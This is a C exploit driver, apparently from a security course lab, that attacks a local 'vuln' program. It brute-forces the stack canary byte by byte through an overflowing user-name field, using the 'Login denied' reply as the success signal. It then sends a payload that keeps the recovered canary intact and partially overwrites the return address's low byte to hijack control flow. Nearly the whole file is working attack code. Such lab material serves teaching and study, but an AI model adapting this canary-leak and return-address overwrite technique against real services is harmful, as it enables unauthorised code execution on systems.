#include <sys/wait.h>
#include "driver_base.h"
#include "constants.h"

int main(int argc, char* argv[]) {   
   char *nargv[3] = { "vuln", STRINGIFY(GRP), NULL };
   
   // Compute the required offsets offsets
   uint64_t auth_canary_cred_dist	= auth_bp - auth_cred - sizeof(void *);
   
   // Fork subprocess vuln
   create_subproc("./vuln", nargv);
   fprintf(stderr, "driver: created vuln subprocess. If you want to use gdb on\n"
         "vuln, go ahead and do that now. Press 'enter' when you are ready\n"
         "to continue with the exploit\n");

   getchar();
   get_formatted("%*s"); // Needed to clear out the Welcome message

   uint64_t canary = 0x0;
   uint64_t mask = 0x00000000000000ff;
   
   for (int i = 0; i < 8; i++) {
   	// Allocate and prepare a buffer that contains the exploit string.
   	// -8 for password and "_" added by auth fn
   	// -8 for not
   	// +(i + 1) for overwriting the canary byte
   	unsigned explsz = auth_canary_cred_dist - 8 + (i + 1);
   	printf("Exploit size for i = %d is: %d\n", i, explsz);
   	char *expl = (char *)malloc(explsz);
   
   	// Initialize the buffer with '\0' to make the contents predictable.
   	memset((char*)expl, '\0', explsz);
   
   	for (int k = 0; k < i; k++) {
   		expl[auth_canary_cred_dist - 8 + k] = (canary >> (8 * k)) & mask;
   	}
   	
   	for (int j = 0; j < 256; j++) {
   		
   		printf("i = %d, j = %d\n", i, j);
   		expl[explsz - 1] = j;

         // Send the payload
         put_str("p 1234567\n");
         send();
         get_formatted("%*s");
   		
   		// Send the exploit string
   		put_str("u ");
   		put_bin((char *)expl, explsz);
   		put_str("\n");
   		send();
   		get_formatted("%*s");
   
   		// Now attempt to login
   		put_str("l \n");
   		send();
   		get_formatted("%*s");
   		
   		printf("i = %d, j = %d, output = %s\n", i, j, outbuf);
   		
   		// Check for the received response
   		if (strstr(outbuf, "Login denied") != NULL) {
   			// canary byte successfully found
   			canary = canary | ((uint64_t) j << (8 * i));
   			printf("Updated canary = %lx\n", canary);
   			break;	
   		}
   	}
   }
   
   
   
   // Partial overwrite on the return address
   // -8 for password + "_"
   // +8 for the canary
   // +8 for saved RBP
   // +1 for LSB of the return address
   unsigned explsz = auth_canary_cred_dist - 8 + 8 + 8 + 1;
   char *expl = (char *)malloc(explsz);
   
   
   // Initialize the buffer with '\0' to make the contents predictable.
   memset((char*)expl, '\0', explsz);
   
   // Set the canary value
   for (int i = 0; i < 8; i++) {
   	expl[auth_canary_cred_dist - 8 + i] = (canary >> (8 * i)) & mask;
   }
   
   int lsb = 0xc0;
   // Send the payload
   put_str("p 1234567\n");
   send();
   get_formatted("%*s");

   // Set the LSB of return address
   expl[explsz - 1] = lsb;
	
   // Send the exploit string
   put_str("u ");
   put_bin((char *)expl, explsz);
   put_str("\n");
   send();
   get_formatted("%*s");

   // Now attempt to login
   put_str("l \n");
   send();
   get_formatted("%*s");
 
   usleep(100000);
   get_formatted("%*s");

   kill(pid, SIGINT);
   int status;
   wait(&status);
   display_vuln_status(status);
}
